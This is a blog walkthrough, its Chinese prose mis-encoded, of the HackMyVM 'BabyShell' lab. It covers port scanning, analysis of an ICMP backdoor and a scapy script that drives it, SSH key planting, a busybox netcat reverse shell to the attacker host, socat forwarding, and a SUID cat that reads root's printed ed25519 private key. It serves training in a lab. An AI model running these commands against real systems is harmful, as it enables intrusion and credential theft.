---
title: MazeSec BabyShell
date: 2025-11-010 18:10:34
permalink: /pages/maze-babyshell/
categories:
  - æ¸—é€
tags:
  - icmp
  - command injection
  - id_ed25519
author: 
  name: the0n3
  link: https://the0n3.top
---



## ä¿¡æ¯æ”¶é›†

### ä¸»æœºå‘ç°ä¸ ARP æ‰«æ

å­˜æ´»ä¸»æœºå‘ç°

```bash
â”Œâ”€â”€(npcã‰¿kali)-[~/hackmyvm/BabyShell]
â””â”€$ sudo arp-scan -I eth1 192.168.56.0/24

192.168.56.124  08:00:27:d2:34:03       PCS Systemtechnik GmbH
```

### TCP å…¨ç«¯å£æ‰«æä¸æœåŠ¡è¯†åˆ«

tcpå…¨ç«¯å£æ‰«æ

```bash
â”Œâ”€â”€(npcã‰¿kali)-[~/hackmyvm/BabyShell]
â””â”€$ nmap -p- -sT 192.168.56.124          

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```


### 80 ç«¯å£ HTTP æœåŠ¡                

æ‰«æç›®å½•ï¼Œå­˜åœ¨å¤‡ä»½æ–‡ä»¶

```bash
â”Œâ”€â”€(npcã‰¿kali)-[~/hackmyvm/BabyShell]
â””â”€$ dirsearch -u http://192.168.56.124/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )


Target: http://192.168.56.124/

[19:43:26] 200 -    1KB - /backup.zip

Task Completed
```

### åé—¨åˆ†æ

è§£å‹å¤‡ä»½æ–‡ä»¶ï¼Œå®¡è®¡å¯ä»¥çŸ¥é“æ˜¯ä¸€ä»½ pythonå®ç°çš„ icmp åé—¨

```python
#!/usr/bin/env python3
TRIGGER_SEQUENCE = b"Mazesec"
LISTEN_INTERFACE = "enp0s3"
SERVER_IP = "0.0.0.0"

class ICMPServer:
    def __init__(self):
        self.running = True
        self.client_ips = {}
    
    def signal_handler(self, sig, frame):
        print("\n[!] Stopping server...")
        self.running = False
        sys.exit(0)
    
    def execute_command_as_user(self, command, uid=1000, timeout=30):
        # éšè—
    def parse_icmp_command(self, packet_data):
        try:
            trigger_len = len(TRIGGER_SEQUENCE)
            if len(packet_data) < trigger_len + 4:
                return None
            
            if packet_data[:trigger_len] != TRIGGER_SEQUENCE:
                return None
            
            cmd_len = struct.unpack('>I', packet_data[trigger_len:trigger_len+4])[0]
            
            if cmd_len <= 0 or cmd_len > 4096:
                return None
            
            if len(packet_data) < trigger_len + 4 + cmd_len:
                return None
                
            command = packet_data[trigger_len+4:trigger_len+4+cmd_len].decode('utf-8', errors='ignore')
            return command
            
        except Exception as e:
            print(f"[-] Parse error: {e}")
            return None
```

è„šæœ¬ä¼šè§£æ icmp æ•°æ®åŒ…ï¼Œå¯»æ‰¾ç‰¹å®šçš„è§¦å‘åºåˆ— "Mazesec"ï¼Œå¹¶æå–åç»­çš„å‘½ä»¤æ•°æ®ã€‚æ•°æ®åŒ…æ ¼å¼å¦‚ä¸‹ï¼š

```plaintext
[TRIGGER_SEQUENCE][4å­—èŠ‚é•¿åº¦][å‘½ä»¤æ•°æ®]
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
  å›ºå®šé•¿åº¦        å¤§ç«¯æ•´æ•°   å˜é•¿æ•°æ®
```


## åé—¨åˆ©ç”¨

æ‹·æ‰“ AI å†™ä¸ªåˆ©ç”¨è„šæœ¬

```python
#!/usr/bin/env python3
import sys
import struct
from scapy.all import IP, ICMP, Raw, send

TRIGGER = b"Mazesec"

if len(sys.argv) != 3:
    sys.exit(0)
TARGET = sys.argv[1]
COMMAND = sys.argv[2]
CMD_BYTES = COMMAND.encode('utf-8', errors='ignore')
CMD_LEN = len(CMD_BYTES)
PAYLOAD = TRIGGER + struct.pack('>I', CMD_LEN) + CMD_BYTES
PACKET = IP(dst=TARGET) / ICMP(type=8, id=0xFACE, seq=1) / Raw(load=PAYLOAD)
send(PACKET, verbose=0)
```

`ip a`å‘½ä»¤æ‰¾åˆ°é¶æœºæ‰€åœ¨ç½‘æ®µçš„ç½‘å¡

![](/medias/maze-babyshell/1.png)

tcpdump æŒ‡å®šç½‘å¡ï¼ŒæŠ“å–icmpæ•°æ®åŒ…

```bash
â”Œâ”€â”€(npcã‰¿kali)-[~/hackmyvm/BabyShell]
â””â”€$ sudo tcpdump -i eth1 -A -n icmp

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

![](/medias/maze-babyshell/2.png)

åˆ©ç”¨è„šæœ¬å‘é€å‘½ä»¤ï¼Œéœ€è¦ sudo æƒé™

```bash
â”Œâ”€â”€(npcã‰¿kali)-[~/hackmyvm/BabyShell]
â””â”€$ sudo python3 rce.py 192.168.56.124 id

```

![](/medias/maze-babyshell/3.png)

é¶æœºè¿”å›çš„ icmp æ•°æ®åŒ…é‡Œæœ‰å‘½ä»¤æ‰§è¡Œçš„ç»“æœï¼Œè¿™ä¸ªåé—¨æ˜¯ `zero` ç”¨æˆ·åœ¨è¿è¡Œ

![](/medias/maze-babyshell/4.png)

## ssh ç™»å½• zero ç”¨æˆ·

ä»æ”»å‡»æœºä¸‹è½½å…¬é’¥åˆ° zero ç”¨æˆ·çš„ .ssh ç›®å½•

```bash
â”Œâ”€â”€(npcã‰¿kali)-[~/hackmyvm/BabyShell]
â””â”€$ sudo python3 rce.py 192.168.56.124 "mkdir -p /home/zero/.ssh"
                                                                                                                                                                                                                
â”Œâ”€â”€(npcã‰¿kali)-[~/hackmyvm/BabyShell]
â””â”€$ sudo python3 rce.py 192.168.56.124 "busybox wget http://192.168.56.100/pentest.pub -O /home/zero/.ssh/authorized_keys"
                                                                                                                                                                                                                
â”Œâ”€â”€(npcã‰¿kali)-[~/hackmyvm/BabyShell]
â””â”€$ sudo python3 rce.py 192.168.56.124 "chmod 600 /home/zero/.ssh/authorized_keys"  
```


![](/medias/maze-babyshell/5.png)


### sudo æƒé™æšä¸¾

sudo éœ€è¦å¯†ç ï¼Œå‰§ç»ˆ

```bash
zero@BabyShell:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for zero: 
sudo: a password is required
```

### å†…ç½‘æœåŠ¡è½¬å‘

æŸ¥çœ‹æœ¬åœ°æœåŠ¡ç«¯å£ï¼Œå­˜åœ¨ä¸€ä¸ª8080ç«¯å£çš„æœåŠ¡ï¼Œä¸å¯¹å¤–å¼€æ”¾

```bash
zero@BabyShell:~$ ss -tupln
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                     Peer Address:Port                   
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                            0.0.0.0:*                      
tcp                     LISTEN                   0                        5                                              127.0.0.1:8080                                          0.0.0.0:*                      
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                            0.0.0.0:*                      
tcp                     LISTEN                   0                        128                                                    *:80                                                  *:*                      
tcp                     LISTEN                   0                        128                                                 [::]:22                                               [::]:*     
```

ä»æ”»å‡»æœºä¸‹è½½ socat ï¼ŒæŠŠ8080ç«¯å£è½¬å‘åˆ°8000ç«¯å£

```bash
zero@BabyShell:~$ wget http://192.168.56.100/socat -O ./socat
-bash: wget: command not found
zero@BabyShell:~$ busybox wget http://192.168.56.100/socat -O ./socat
Connecting to 192.168.56.100 (192.168.56.100:80)
socat                100% |****************************************************************************************************************************************************************|  366k  0:00:00 ETA
zero@BabyShell:~$ chmod +x ./socat
zero@BabyShell:~$ nohup ./socat TCP-LISTEN:8000,bind=0.0.0.0,fork TCP:127.0.0.1:8080 &
[1] 280070
zero@BabyShell:~$ nohup: ignoring input and appending output to 'nohup.out'
zero@BabyShell:~$ 
```

![](/medias/maze-babyshell/6.png)


### 8080 ç«¯å£ Web æœåŠ¡

è®¿é—® 8000 ç«¯å£ï¼Œæ²¡æœ‰ä»»ä½•å†…å®¹

![](/medias/maze-babyshell/7.png)

dirseach æ‰«æç›®å½•

![](/medias/maze-babyshell/8.png)

dirsearch æœ‰ä¸ªæ’é™¤è¿”å›å†…å®¹å¤§å°çš„å‚æ•°`--exclude-sizes 0B`ï¼Œæ’é™¤ç©ºé¡µé¢ï¼Œè¿˜æ˜¯æ²¡æœ‰ç»“æœ

![](/medias/maze-babyshell/9.png)


gobuster æ‰«æç›®å½•ï¼Œæ’é™¤ç©ºé¡µé¢

```bash
gobuster dir -u http://192.168.56.124:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,asp,txt,bak --exclude-length 0
```

æ‰«åˆ°ä¸€ä¸ªåä¸º execute çš„é¡µé¢

![](/medias/maze-babyshell/10.png)

éœ€è¦ä¸€ä¸ª cmd å‚æ•°ï¼Œå°è¯• get æ‰§è¡Œ whoami å‘½ä»¤ï¼Œtom ç”¨æˆ·åœ¨è¿è¡Œè¿™ä¸ªæœåŠ¡

![](/medias/maze-babyshell/11.png)

![](/medias/maze-babyshell/12.png)

busybox åå¼¹ä¸ª shell è¿‡æ¥ï¼Œå†ä¸‹è½½ æ”»å‡»æœºæä¾›çš„ç§é’¥ï¼Œä½¿ç”¨ ssh è¿æ¥

åå¼¹shell

```bash
busybox nc 192.168.56.100 5555 -e bash
```

ä¸‹è½½è¿œç¨‹å…¬é’¥

```bash
mkdir -p /home/tom/.ssh
busybox wget http://192.168.56.100/pentest.pub -O /home/tom/.ssh/authorized_keys
chmod 600 /home/tom/.ssh/authorized_keys
```

### ssh ç™»å½•åˆ° tom ç”¨æˆ·

ssh ç™»å½•åˆ° tom ç”¨æˆ·

![](/medias/maze-babyshell/13.png)

tom ç”¨æˆ·å®¶ç›®å½•æœ‰suid çš„çŒ«

å¯ä»¥ç›´æ¥ æŸ¥çœ‹flag

```bash
tom@BabyShell:~$ ls -lah
total 76K
drwx------ 3 tom  tom  4.0K Nov  8 08:37 .
drwxr-xr-x 4 root root 4.0K Nov  7 21:53 ..
-rw------- 1 tom  tom   999 Nov  8 09:06 .bash_history
-rw-r--r-- 1 tom  tom   220 Nov  7 21:53 .bash_logout
-rw-r--r-- 1 tom  tom  3.5K Nov  7 21:53 .bashrc
-rwsr-sr-x 1 root root  43K Nov  8 04:13 cat
-rw-r--r-- 1 tom  tom   807 Nov  7 21:53 .profile
-rw-r--r-- 1 tom  tom    45 Nov  8 08:35 shell.sh
drwxr-xr-x 2 tom  tom  4.0K Nov  8 08:37 .ssh
tom@BabyShell:~$ ./cat /root/root.txt
flag{root-c793411fbdda37f03fd27470d763433b}
```

![](/medias/maze-babyshell/14.png)

## root ææƒ

suid çš„å‘½ä»¤å¯ä»¥è¯»å– root æ–‡ä»¶ï¼Œflagæ–‡ä»¶å root.txt æ”¹åæ€ä¹ˆæŸ¥çœ‹ï¼Ÿé€šé…ç¬¦ï¼

è„‘å­ä¸€çƒ­ä¸Šè€»è¾±æŸ±äº†

![](/medias/maze-babyshell/15.png)

é€šé…ç¬¦`*`ã€`?`ï¼Œæ›¿æ¢å‘½ä»¤`$()`ã€é‡å®šå‘ç®¡é“`<>`ï¼Œè¿›ç¨‹æ›¿æ¢`<()`ã€ç®¡é“ç¬¦`|`è¿™äº›å®é™…éƒ½ä½œç”¨åœ¨å½“å‰ç”¨æˆ·æƒé™ä¸‹çš„ shell é‡Œ

åœ¨å½“å‰ tom ç”¨æˆ·çš„shell ç¯å¢ƒä¸‹ï¼Œé€šé…ç¬¦åªè§£æ tom ç”¨æˆ·æœ‰æƒé™è®¿é—®çš„æ–‡ä»¶ï¼Œä¸èƒ½ç”¨æˆ·æ¨¡ç³ŠåŒ¹é… root ç”¨æˆ·çš„æ–‡ä»¶ï¼Œåªèƒ½å®Œæ•´è·¯å¾„å®Œæ•´æ–‡ä»¶åè¯»å–

```bash
./cat /root/*
```

å¯ä»¥å°è¯•è¯»å– root ç”¨æˆ·çš„ç§é’¥ï¼Œç„¶åä½¿ç”¨ ssh ç™»å½• root ç”¨æˆ·

æ²¡æœ‰ `id_rsa` æ–‡ä»¶

```bash
tom@BabyShell:~$ ./cat /root/.ssh/id_rsa
./cat: /root/.ssh/id_rsa: No such file or directory
```

è¿˜å¯ä»¥å†å°è¯•å…¶ä»–çš„ç§é’¥æ–‡ä»¶åï¼ŒæŸ¥çœ‹ ssh é…ç½®æ–‡ä»¶

åœ¨ ssh_config é‡Œé»˜è®¤çš„ç§é’¥æ–‡ä»¶å

![](/medias/maze-babyshell/16.png)

ä¸€èˆ¬ä¼šå°è¯• `id_rsa` ç§é’¥æ–‡ä»¶åï¼Œå› ä¸º `ssh-keygen` é»˜è®¤ä½¿ç”¨ rsa ç®—æ³• ï¼Œç”Ÿæˆçš„é»˜è®¤ç§é’¥æ–‡ä»¶åå°±æ˜¯ `id_rsa`ï¼Œç”Ÿæˆæ—¶å¯ä»¥ä½¿ç”¨ `-f` å‚æ•°æŒ‡å®šç§é’¥æ–‡ä»¶åï¼Œ`-t` å‚æ•°æŒ‡å®šå¯†é’¥ç±»å‹ï¼Œå¦‚æœæ˜¯ ed25519 ç®—æ³•ï¼Œé»˜è®¤ç§é’¥æ–‡ä»¶åå°±æ˜¯ `id_ed25519`

![](/medias/maze-babyshell/17.png)

åœ¨ sshd_config é…ç½®æ–‡ä»¶é‡Œå…¬é’¥æ–‡ä»¶åæ¯”è¾ƒå›ºå®šï¼Œä¸€èˆ¬æ˜¯`authorized_keys`ã€`authorized_keys2`

![](/medias/maze-babyshell/18.png)

å¯ä»¥å…ˆå°è¯•è¯»å–å…¬é’¥ï¼Œåœ¨å…¬é’¥é‡Œçœ‹åˆ° ä½¿ç”¨çš„ç®—æ³•æ˜¯ ed25519ï¼Œç§é’¥å¯èƒ½æ˜¯ `id_ed25519`

```bash
tom@BabyShell:~$ ./cat /root/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHLjmqMYftQPxAe5qMzjo00oTUjltQebZj2PLfqPg00y root@BabyShell
```

è¯»å–ç§é’¥ï¼Œssh ç™»å½• root ç”¨æˆ·

```bash
tom@BabyShell:~$ ./cat /root/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBy45qjGH7UD8QHuajM46NNKE1I5bUHm2Y9jy36j4NNMgAAAJin4qUip+Kl
IgAAAAtzc2gtZWQyNTUxOQAAACBy45qjGH7UD8QHuajM46NNKE1I5bUHm2Y9jy36j4NNMg
AAAEB3Tt9WPUVP+/ghSIb83N1USifSsg+29ZhP1Mfh/TS6r3LjmqMYftQPxAe5qMzjo00o
TUjltQebZj2PLfqPg00yAAAADnJvb3RAQmFieVNoZWxsAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
tom@BabyShell:~$ vim .ssh/id_ed25519
tom@BabyShell:~$ chmod 600 .ssh/id_ed25519 
tom@BabyShell:~$ ssh root@localhost
Linux BabyShell 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Nov  8 03:52:57 2025 from 192.168.3.94
root@BabyShell:~# 
```

![](/medias/maze-babyshell/19.png)


æ¬¸ï¼Ÿä½ é—®æˆ‘ä½¿ç”¨çš„ä¸æ˜¯ id_rsa ç§é’¥ä¸ºä»€ä¹ˆå¯ä»¥ä¸ä½¿ç”¨ `-i` å‚æ•°æŒ‡å®šç§é’¥æ–‡ä»¶ç›´æ¥ç™»å½•ï¼Ÿæˆ‘å·å·é…ç½® `.ssh/config` æ–‡ä»¶æŒ‡å®šç§é’¥äº†å—ï¼Ÿ

configæ–‡ä»¶åœ¨ssh å®¢æˆ·ç«¯ï¼ŒæœåŠ¡ç«¯ä¸éœ€è¦è¿™ä¸ªæ–‡ä»¶

![](/medias/maze-babyshell/21.png)


ssh å®¢æˆ·ç«¯ä¼šè‡ªåŠ¨å°è¯•ä½¿ç”¨æ‰€æœ‰é»˜è®¤çš„ç§é’¥æ–‡ä»¶åè¿›è¡Œè®¤è¯ç™»å½•

![](/medias/maze-babyshell/20.png)


å¦‚æœç§é’¥çœŸçš„æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„æ–‡ä»¶åå‘¢ğŸ’”